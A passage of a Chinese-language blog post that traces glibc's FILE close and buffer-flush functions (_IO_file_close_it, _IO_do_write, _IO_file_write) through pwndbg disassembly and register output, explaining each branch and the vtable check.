(_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span><br><span class="line">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr               \</span><br><span class="line">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span><br></pre></td></tr></table></figure><p>可以看到它对应的是调用<code>_IO_do_write</code>函数去输出此时的输出缓冲区<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8bf98 &lt;_IO_file_close_it+264&gt;    mov    edx, dword ptr [rdi + 0xc0]     EDX, [0x555555559360] =&gt; 0xffffffff</span><br><span class="line">0x7ffff7c8bf9e &lt;_IO_file_close_it+270&gt;    test   edx, edx                        0xffffffff &amp; 0xffffffff     EFLAGS =&gt; 0x286 [ cf PF af zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8bfa0 &lt;_IO_file_close_it+272&gt;  ✔ jle    _IO_file_close_it+312       &lt;_IO_file_close_it+312&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8bfc8 &lt;_IO_file_close_it+312&gt;    mov    rsi, qword ptr [rdi + 0x20]     RSI, [0x5555555592c0] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8bfcc &lt;_IO_file_close_it+316&gt;    mov    rdx, qword ptr [rdi + 0x28]     RDX, [0x5555555592c8] =&gt; 0x5555555594d0 ◂— 0</span><br><span class="line">0x7ffff7c8bfd0 &lt;_IO_file_close_it+320&gt;    sub    rdx, rsi                        RDX =&gt; 32 (0x5555555594d0 - 0x5555555594b0)</span><br><span class="line">0x00007ffff7c8bfd3 &lt;+323&gt;:   call   0x7ffff7c8c930 &lt;_IO_new_do_write&gt;</span><br></pre></td></tr></table></figure><p>放上反汇编结果方便分析<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_do_write:</span><br><span class="line">   0x00007ffff7c8c930 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8c934 &lt;+4&gt;:     xor    eax,eax</span><br><span class="line">   0x00007ffff7c8c936 &lt;+6&gt;:     test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8c939 &lt;+9&gt;:     jne    0x7ffff7c8c940 &lt;_IO_new_do_write+16&gt;</span><br><span class="line">   0x00007ffff7c8c93b &lt;+11&gt;:    ret</span><br><span class="line">   0x00007ffff7c8c93c &lt;+12&gt;:    nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8c940 &lt;+16&gt;:    push   r15</span><br><span class="line">   0x00007ffff7c8c942 &lt;+18&gt;:    lea    r15,[rip+0x18a0b7]        # 0x7ffff7e16a00 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7c8c949 &lt;+25&gt;:    push   r14</span><br><span class="line">   0x00007ffff7c8c94b &lt;+27&gt;:    push   r13</span><br><span class="line">   0x00007ffff7c8c94d &lt;+29&gt;:    lea    r13,[rip+0x18ae14]        # 0x7ffff7e17768</span><br><span class="line">   0x00007ffff7c8c954 &lt;+36&gt;:    push   r12</span><br><span class="line">   0x00007ffff7c8c956 &lt;+38&gt;:    sub    r13,r15</span><br><span class="line">   0x00007ffff7c8c959 &lt;+41&gt;:    mov    r12,rsi</span><br><span class="line">   0x00007ffff7c8c95c &lt;+44&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8c95d &lt;+45&gt;:    mov    rbp,rdx</span><br><span class="line">   0x00007ffff7c8c960 &lt;+48&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8c961 &lt;+49&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8c964 &lt;+52&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c8c968 &lt;+56&gt;:    mov    r14,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7c8c96f &lt;+63&gt;:    test   DWORD PTR [rdi],0x1000</span><br><span class="line">   0x00007ffff7c8c975 &lt;+69&gt;:    jne    0x7ffff7c8ca40 &lt;_IO_new_do_write+272&gt;</span><br><span class="line">   0x00007ffff7c8c97b &lt;+75&gt;:    mov    rax,QWORD PTR [rdi+0x10]</span><br><span class="line">   0x00007ffff7c8c97f &lt;+79&gt;:    mov    rsi,QWORD PTR [rdi+0x20]</span><br><span class="line">   0x00007ffff7c8c983 &lt;+83&gt;:    cmp    rax,rsi</span><br><span class="line">   0x00007ffff7c8c986 &lt;+86&gt;:    je     0x7ffff7c8c9c5 &lt;_IO_new_do_write+149&gt;</span><br><span class="line">   0x00007ffff7c8c988 &lt;+88&gt;:    mov    rdx,r14</span><br><span class="line">   0x00007ffff7c8c98b &lt;+91&gt;:    sub    rdx,r15</span><br><span class="line">   0x00007ffff7c8c98e &lt;+94&gt;:    cmp    r13,rdx</span><br><span class="line">   0x00007ffff7c8c991 &lt;+97&gt;:    jbe    0x7ffff7c8ca90 &lt;_IO_new_do_write+352&gt;</span><br><span class="line">   0x00007ffff7c8c997 &lt;+103&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8c99c &lt;+108&gt;:   sub    rsi,rax</span><br><span class="line">   0x00007ffff7c8c99f &lt;+111&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8c9a2 &lt;+114&gt;:   call   QWORD PTR [r14+0x80]</span><br><span class="line">   0x00007ffff7c8c9a9 &lt;+121&gt;:   mov    rdx,rax</span><br><span class="line">   0x00007ffff7c8c9ac &lt;+124&gt;:   mov    eax,0xffffffff</span><br><span class="line">   0x00007ffff7c8c9b1 &lt;+129&gt;:   cmp    rdx,0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8c9b5 &lt;+133&gt;:   je     0x7ffff7c8ca2a &lt;_IO_new_do_write+250&gt;</span><br><span class="line">   0x00007ffff7c8c9b7 &lt;+135&gt;:   mov    QWORD PTR [rbx+0x90],rdx</span><br><span class="line">   0x00007ffff7c8c9be &lt;+142&gt;:   mov    r14,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007ffff7c8c9c5 &lt;+149&gt;:   mov    rax,r14</span><br><span class="line">   0x00007ffff7c8c9c8 &lt;+152&gt;:   sub    rax,r15</span><br><span class="line">   0x00007ffff7c8c9cb &lt;+155&gt;:   cmp    rax,r13</span><br><span class="line">   0x00007ffff7c8c9ce &lt;+158&gt;:   jae    0x7ffff7c8ca80 &lt;_IO_new_do_write+336&gt;</span><br><span class="line">   0x00007ffff7c8c9d4 &lt;+164&gt;:   mov    rdx,rbp</span><br><span class="line">   0x00007ffff7c8c9d7 &lt;+167&gt;:   mov    rsi,r12</span><br><span class="line">   0x00007ffff7c8c9da &lt;+170&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c8c9dd &lt;+173&gt;:   call   QWORD PTR [r14+0x78]</span><br><span class="line">   0x00007ffff7c8c9e1 &lt;+177&gt;:   mov    r13,rax</span><br><span class="line">   0x00007ffff7c8c9e4 &lt;+180&gt;:   movzx  eax,WORD PTR [rbx+0x80]</span><br><span class="line">   0x00007ffff7c8c9eb &lt;+187&gt;:   test   r13,r13</span><br><span class="line">   0x00007ffff7c8c9ee &lt;+190&gt;:   je     0x7ffff7c8c9f5 &lt;_IO_new_do_write+197&gt;</span><br><span class="line">   0x00007ffff7c8c9f0 &lt;+192&gt;:   test   ax,ax</span><br><span class="line">   0x00007ffff7c8c9f3 &lt;+195&gt;:   jne    0x7ffff7c8ca60 &lt;_IO_new_do_write+304&gt;</span><br><span class="line">   0x00007ffff7c8c9f5 &lt;+197&gt;:   mov    rax,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c8c9f9 &lt;+201&gt;:   mov    edx,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c8c9ff &lt;+207&gt;:   movq   xmm0,rax</span><br><span class="line">   0x00007ffff7c8ca04 &lt;+212&gt;:   mov    QWORD PTR [rbx+0x28],rax</span><br><span class="line">   0x00007ffff7c8ca08 &lt;+216&gt;:   punpcklqdq xmm0,xmm0</span><br><span class="line">   0x00007ffff7c8ca0c &lt;+220&gt;:   movups XMMWORD PTR [rbx+0x8],xmm0</span><br><span class="line">   0x00007ffff7c8ca10 &lt;+224&gt;:   movups XMMWORD PTR [rbx+0x18],xmm0</span><br><span class="line">   0x00007ffff7c8ca14 &lt;+228&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8ca16 &lt;+230&gt;:   jle    0x7ffff7c8ca50 &lt;_IO_new_do_write+288&gt;</span><br><span class="line">   0x00007ffff7c8ca18 &lt;+232&gt;:   mov    rax,QWORD PTR [rbx+0x40]</span><br><span class="line">   0x00007ffff7c8ca1c &lt;+236&gt;:   mov    QWORD PTR [rbx+0x30],rax</span><br><span class="line">   0x00007ffff7c8ca20 &lt;+240&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c8ca22 &lt;+242&gt;:   cmp    rbp,r13</span><br><span class="line">   0x00007ffff7c8ca25 &lt;+245&gt;:   setne  al</span><br><span class="line">   0x00007ffff7c8ca28 &lt;+248&gt;:   neg    eax</span><br><span class="line">   0x00007ffff7c8ca2a &lt;+250&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c8ca2e &lt;+254&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8ca2f &lt;+255&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8ca30 &lt;+256&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8ca32 &lt;+258&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8ca34 &lt;+260&gt;:   pop    r14</span><br><span class="line">   0x00007ffff7c8ca36 &lt;+262&gt;:   pop    r15</span><br><span class="line">   0x00007ffff7c8ca38 &lt;+264&gt;:   ret</span><br><span class="line">   0x00007ffff7c8ca39 &lt;+265&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8ca40 &lt;+272&gt;:   mov    QWORD PTR [rdi+0x90],0xffffffffffffffff</span><br><span class="line">   0x00007ffff7c8ca4b &lt;+283&gt;:   jmp    0x7ffff7c8c9c5 &lt;_IO_new_do_write+149&gt;</span><br><span class="line">   0x00007ffff7c8ca50 &lt;+288&gt;:   test   DWORD PTR [rbx],0x202</span><br><span class="line">   0x00007ffff7c8ca56 &lt;+294&gt;:   jne    0x7ffff7c8ca1c &lt;_IO_new_do_write+236&gt;</span><br><span class="line">   0x00007ffff7c8ca58 &lt;+296&gt;:   jmp    0x7ffff7c8ca18 &lt;_IO_new_do_write+232&gt;</span><br><span class="line">   0x00007ffff7c8ca5a &lt;+298&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ca60 &lt;+304&gt;:   lea    edi,[rax-0x1]</span><br><span class="line">   0x00007ffff7c8ca63 &lt;+307&gt;:   mov    edx,r13d</span><br><span class="line">   0x00007ffff7c8ca66 &lt;+310&gt;:   mov    rsi,r12</span><br><span class="line">   0x00007ffff7c8ca69 &lt;+313&gt;:   call   0x7ffff7c8e8b0 &lt;__GI__IO_adjust_column&gt;</span><br><span class="line">   0x00007ffff7c8ca6e &lt;+318&gt;:   add    eax,0x1</span><br><span class="line">   0x00007ffff7c8ca71 &lt;+321&gt;:   mov    WORD PTR [rbx+0x80],ax</span><br><span class="line">   0x00007ffff7c8ca78 &lt;+328&gt;:   jmp    0x7ffff7c8c9f5 &lt;_IO_new_do_write+197&gt;</span><br><span class="line">   0x00007ffff7c8ca7d &lt;+333&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8ca80 &lt;+336&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8ca85 &lt;+341&gt;:   jmp    0x7ffff7c8c9d4 &lt;_IO_new_do_write+164&gt;</span><br><span class="line">   0x00007ffff7c8ca8a &lt;+346&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8ca90 &lt;+352&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c8ca95 &lt;+357&gt;:   mov    rsi,QWORD PTR [rbx+0x20]</span><br><span class="line">   0x00007ffff7c8ca99 &lt;+361&gt;:   mov    rax,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7c8ca9d &lt;+365&gt;:   jmp    0x7ffff7c8c997 &lt;_IO_new_do_write+103&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个函数先判断输出缓冲区有无数据需要输出（这一部分在<code>fwrite</code>函数分析过，但那时不需要输出）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c930 &lt;_IO_do_write&gt;       endbr64</span><br><span class="line">0x7ffff7c8c934 &lt;_IO_do_write+4&gt;     xor    eax, eax     EAX =&gt; 0</span><br><span class="line">0x7ffff7c8c936 &lt;_IO_do_write+6&gt;     test   rdx, rdx     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c939 &lt;_IO_do_write+9&gt;   ✔ jne    _IO_do_write+16             &lt;_IO_do_write+16&gt;</span><br></pre></td></tr></table></figure><p>我们这里刚调用过<code>fwrite</code>函数，所以缓冲区是需要刷新的，所以继续往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c940 &lt;_IO_do_write+16&gt;    push   r15</span><br><span class="line">0x7ffff7c8c942 &lt;_IO_do_write+18&gt;    lea    r15, [rip + 0x18a0b7]     R15 =&gt; 0x7ffff7e16a00 (_IO_helper_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8c949 &lt;_IO_do_write+25&gt;    push   r14</span><br><span class="line">0x7ffff7c8c94b &lt;_IO_do_write+27&gt;    push   r13</span><br><span class="line">0x7ffff7c8c94d &lt;_IO_do_write+29&gt;    lea    r13, [rip + 0x18ae14]     R13 =&gt; 0x7ffff7e17768 ◂— 0</span><br><span class="line">0x7ffff7c8c954 &lt;_IO_do_write+36&gt;    push   r12</span><br><span class="line">0x7ffff7c8c956 &lt;_IO_do_write+38&gt;    sub    r13, r15                  R13 =&gt; 0xd68 (0x7ffff7e17768 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8c959 &lt;_IO_do_write+41&gt;    mov    r12, rsi                        R12 =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c95c &lt;_IO_do_write+44&gt;    push   rbp</span><br><span class="line">0x7ffff7c8c95d &lt;_IO_do_write+45&gt;    mov    rbp, rdx                        RBP =&gt; 0x20</span><br><span class="line">0x7ffff7c8c960 &lt;_IO_do_write+48&gt;    push   rbx</span><br><span class="line">0x7ffff7c8c961 &lt;_IO_do_write+49&gt;    mov    rbx, rdi                        RBX =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8c964 &lt;_IO_do_write+52&gt;    sub    rsp, 8                          RSP =&gt; 0x7fffffffdc00 (0x7fffffffdc08 - 0x8)</span><br><span class="line">0x7ffff7c8c968 &lt;_IO_do_write+56&gt;    mov    r14, qword ptr [rdi + 0xd8]     R14, [0x555555559378] =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8c96f &lt;_IO_do_write+63&gt;    test   dword ptr [rdi], 0x1000         0xfbad2c04 &amp; 0x1000     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c975 &lt;_IO_do_write+69&gt;  ✘ jne    _IO_do_write+272            &lt;_IO_do_write+272&gt;</span><br></pre></td></tr></table></figure><p>这里是<code>vtable</code>的安全检查，不再赘述，继续往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c97b &lt;_IO_do_write+75&gt;     mov    rax, qword ptr [rdi + 0x10]     RAX, [0x5555555592b0] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c97f &lt;_IO_do_write+79&gt;     mov    rsi, qword ptr [rdi + 0x20]     RSI, [0x5555555592c0] =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c983 &lt;_IO_do_write+83&gt;     cmp    rax, rsi                        0x5555555594b0 - 0x5555555594b0     EFLAGS =&gt; 0x246 [ cf PF af ZF sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c986 &lt;_IO_do_write+86&gt;   ✔ je     _IO_do_write+149            &lt;_IO_do_write+149&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c8c9c5 &lt;_IO_do_write+149&gt;    mov    rax, r14     RAX =&gt; 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br><span class="line">0x7ffff7c8c9c8 &lt;_IO_do_write+152&gt;    sub    rax, r15     RAX =&gt; 0xc00 (0x7ffff7e17600 - 0x7ffff7e16a00)</span><br><span class="line">0x7ffff7c8c9cb &lt;_IO_do_write+155&gt;    cmp    rax, r13     0xc00 - 0xd68     EFLAGS =&gt; 0x293 [ CF pf AF zf SF IF df of ac ]</span><br><span class="line">0x7ffff7c8c9ce &lt;_IO_do_write+158&gt;  ✘ jae    _IO_do_write+336            &lt;_IO_do_write+336&gt;</span><br></pre></td></tr></table></figure><p>往下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c9d4 &lt;_IO_do_write+164&gt;    mov    rdx, rbp     RDX =&gt; 0x20</span><br><span class="line">0x7ffff7c8c9d7 &lt;_IO_do_write+167&gt;    mov    rsi, r12     RSI =&gt; 0x5555555594b0 ◂— &#x27;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span><br><span class="line">0x7ffff7c8c9da &lt;_IO_do_write+170&gt;    mov    rdi, rbx     RDI =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8c9dd &lt;_IO_do_write+173&gt;    call   qword ptr [r14 + 0x78]      &lt;_IO_file_write&gt;</span><br></pre></td></tr></table></figure><p>这里调用了<code>vtable-&gt;_IO_file_write</code>来输出缓冲区数据以刷新缓冲区（我们这里<code>fp-&gt;_IO_write_base</code>与<code>fp-&gt;_IO_write_ptr</code>间是有数据的）<br>跟进<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_file_write:</span><br><span class="line">=&gt; 0x00007ffff7c8aec0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c8aec4 &lt;+4&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8aec6 &lt;+6&gt;:     mov    r13,rdi</span><br><span class="line">   0x00007ffff7c8aec9 &lt;+9&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8aecb &lt;+11&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8aecc &lt;+12&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8aecd &lt;+13&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c8aed1 &lt;+17&gt;:    test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8aed4 &lt;+20&gt;:    jle    0x7ffff7c8af58 &lt;_IO_new_file_write+152&gt;</span><br><span class="line">   0x00007ffff7c8aeda &lt;+26&gt;:    mov    rbp,rsi</span><br><span class="line">   0x00007ffff7c8aedd &lt;+29&gt;:    mov    r12,rdx</span><br><span class="line">   0x00007ffff7c8aee0 &lt;+32&gt;:    mov    rbx,rdx</span><br><span class="line">   0x00007ffff7c8aee3 &lt;+35&gt;:    jmp    0x7ffff7c8aefd &lt;_IO_new_file_write+61&gt;</span><br><span class="line">   0x00007ffff7c8aee5 &lt;+37&gt;:    nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8aee8 &lt;+40&gt;:    call   0x7ffff7d14870 &lt;__GI___libc_write&gt;</span><br><span class="line">   0x00007ffff7c8aeed &lt;+45&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c8aef0 &lt;+48&gt;:    js     0x7ffff7c8af20 &lt;_IO_new_file_write+96&gt;</span><br><span class="line">   0x00007ffff7c8aef2 &lt;+50&gt;:    sub    rbx,rax</span><br><span class="line">   0x00007ffff7c8aef5 &lt;+53&gt;:    add    rbp,rax</span><br><span class="line">   0x00007ffff7c8aef8 &lt;+56&gt;:    test   rbx,rbx</span><br><span class="line">   0x00007ffff7c8aefb &lt;+59&gt;:    jle    0x7ffff7c8af50 &lt;_IO_new_file_write+144&gt;</span><br><span class="line">   0x00007ffff7c8aefd &lt;+61&gt;:    mov    edi,DWORD PTR [r13+0x70]</span><br><span class="line">   0x00007ffff7c8af01 &lt;+65&gt;:    mov    rdx,rbx</span><br><span class="line">   0x00007ffff7c8af04 &lt;+68&gt;:    mov    rsi,rbp</span><br><span class="line">   0x00007ffff7c8af07 &lt;+71&gt;:    test   BYTE PTR [r13+0x74],0x2</span><br><span class="line">   0x00007ffff7c8af0c &lt;+76&gt;:    je     0x7ffff7c8aee8 &lt;_IO_new_file_write+40&gt;</span><br><span class="line">   0x00007ffff7c8af0e &lt;+78&gt;:    call   0x7ffff7d19b90 &lt;__GI___write_nocancel&gt;</span><br><span class="line">   0x00007ffff7c8af13 &lt;+83&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c8af16 &lt;+86&gt;:    jns    0x7ffff7c8aef2 &lt;_IO_new_file_write+50&gt;</span><br><span class="line">   0x00007ffff7c8af18 &lt;+88&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8af20 &lt;+96&gt;:    or     DWORD PTR [r13+0x0],0x20</span><br><span class="line">   0x00007ffff7c8af25 &lt;+101&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8af28 &lt;+104&gt;:   sub    rax,rbx</span><br><span class="line">   0x00007ffff7c8af2b &lt;+107&gt;:   mov    rdx,QWORD PTR [r13+0x90]</span><br><span class="line">   0x00007ffff7c8af32 &lt;+114&gt;:   test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8af35 &lt;+117&gt;:   js     0x7ffff7c8af41 &lt;_IO_new_file_write+129&gt;</span><br><span class="line">   0x00007ffff7c8af37 &lt;+119&gt;:   add    rdx,rax</span><br><span class="line">   0x00007ffff7c8af3a &lt;+122&gt;:   mov    QWORD PTR [r13+0x90],rdx</span><br><span class="line">   0x00007ffff7c8af41 &lt;+129&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c8af45 &lt;+133&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8af46 &lt;+134&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8af47 &lt;+135&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8af49 &lt;+137&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8af4b &lt;+139&gt;:   ret</span><br><span class="line">   0x00007ffff7c8af4c &lt;+140&gt;:   nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x00007ffff7c8af50 &lt;+144&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c8af53 &lt;+147&gt;:   sub    rax,rbx</span><br><span class="line">   0x00007ffff7c8af56 &lt;+150&gt;:   jmp    0x7ffff7c8af2b &lt;_IO_new_file_write+107&gt;</span><br><span class="line">   0x00007ffff7c8af58 &lt;+152&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c8af5a &lt;+154&gt;:   jmp    0x7ffff7c8af2b &lt;_IO_new_file_write+107&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>仍然是判断需要输出的数据长度是否为0<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8aec4 &lt;_IO_file_write+4&gt;     push   r13</span><br><span class="line">0x7ffff7c8aec6 &lt;_IO_file_write+6&gt;     mov    r13, rdi     R13 =&gt; 0x5555555592a0 ◂— 0xfbad2c04</span><br><span class="line">0x7ffff7c8aec9 &lt;_IO_file_write+9&gt;     push   r12</span><br><span class="line">0x7ffff7c8aecb &lt;_IO_file_write+11&gt;    push   rbp</span><br><span class="line">0x7ffff7c8aecc &lt;_IO_file_write+12&gt;    push   rbx</span><br><span class="line">0x7ffff7c8aecd &lt;_IO_file_write+13&gt;    sub    rsp, 8       RSP =&gt; 0x7fffffffdbd0 (0x7fffffffdbd8 - 0x8)</span><br><span class="line">0x7ffff7c8aed1 &lt;_IO_file_write+17&gt;    test   rdx, rdx     0x20 &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8aed4 